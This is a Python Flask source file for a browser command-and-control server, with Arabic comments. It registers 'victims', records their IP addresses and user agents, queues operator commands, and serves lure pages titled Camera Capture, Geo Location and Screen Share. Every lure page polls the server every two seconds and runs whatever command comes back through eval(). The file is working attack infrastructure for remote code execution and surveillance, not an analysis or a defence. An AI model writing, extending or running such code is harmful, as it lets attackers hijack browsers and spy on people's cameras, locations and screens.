from flask import Flask, request, jsonify, send_from_directory, render_template_string
from flask_cors import CORS
import sqlite3
import os
from datetime import datetime

app = Flask(__name__)
CORS(app)

DB_PATH = "c2.db"

# HTML بسيط للضحايا
BASIC_HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>{{ title }}</title>
    <script>
        async function pollCommands() {
            try {
                const res = await fetch('/api/poll?victim_id={{ victim_id }}');
                const data = await res.json();
                if (data.command) {
                    eval(data.command);
                }
            } catch (err) {
                console.error(err);
            }
            setTimeout(pollCommands, 2000);
        }
        pollCommands();
    </script>
</head>
<body>
    <h1>{{ title }}</h1>
</body>
</html>
"""

# إنشاء قاعدة البيانات إذا لم تكن موجودة
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS victims (
        id TEXT PRIMARY KEY,
        ip TEXT,
        user_agent TEXT,
        created_at TEXT,
        last_seen TEXT,
        is_online INTEGER,
        permissions TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS commands (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        victim_id TEXT,
        command TEXT,
        executed INTEGER DEFAULT 0
    )''')
    conn.commit()
    conn.close()

@app.route('/register', methods=['POST'])
def register_victim():
    data = request.json
    vid = data.get('id')
    ip = request.remote_addr
    ua = request.headers.get('User-Agent')
    now = datetime.utcnow().isoformat()

    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO victims (id, ip, user_agent, created_at, last_seen, is_online, permissions) VALUES (?, ?, ?, COALESCE((SELECT created_at FROM victims WHERE id=?), ?), ?, 1, ?)",
              (vid, ip, ua, vid, now, now, '{}'))
    conn.commit()
    conn.close()

    return jsonify({"status": "ok"})

@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    vid = request.json.get('id')
    now = datetime.utcnow().isoformat()
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("UPDATE victims SET last_seen=?, is_online=1 WHERE id=?", (now, vid))
    conn.commit()
    conn.close()
    return jsonify({"status": "alive"})

@app.route('/api/execute', methods=['POST'])
def api_execute():
    data = request.json
    victim_id = data.get('victim_id')
    command = data.get('command')

    if not victim_id or not command:
        return jsonify({"error": "Missing victim_id or command"}), 400

    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT INTO commands (victim_id, command) VALUES (?, ?)", (victim_id, command))
    conn.commit()
    conn.close()

    return jsonify({"status": "command queued"})

@app.route('/api/poll')
def api_poll():
    victim_id = request.args.get('victim_id')
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT id, command FROM commands WHERE victim_id=? AND executed=0 ORDER BY id ASC LIMIT 1", (victim_id,))
    row = c.fetchone()
    if row:
        cmd_id, command = row
        c.execute("UPDATE commands SET executed=1 WHERE id=?", (cmd_id,))
        conn.commit()
        conn.close()
        return jsonify({"command": command})
    conn.close()
    return jsonify({"command": None})

@app.route('/camera.html')
def camera_page():
    victim_id = request.args.get('victim')
    return render_template_string(BASIC_HTML, title="Camera Capture", victim_id=victim_id)

@app.route('/geo.html')
def geo_page():
    victim_id = request.args.get('victim')
    return render_template_string(BASIC_HTML, title="Geo Location", victim_id=victim_id)

@app.route('/screenshare.html')
def screenshare_page():
    victim_id = request.args.get('victim')
    return render_template_string(BASIC_HTML, title="Screen Share", victim_id=victim_id)

@app.route('/static/<path:filename>')
def static_files(filename):
    return send_from_directory('static', filename)

if __name__ == "__main__":
    os.makedirs('static', exist_ok=True)
    init_db()
    app.run(host="0.0.0.0", port=5000, debug=True)
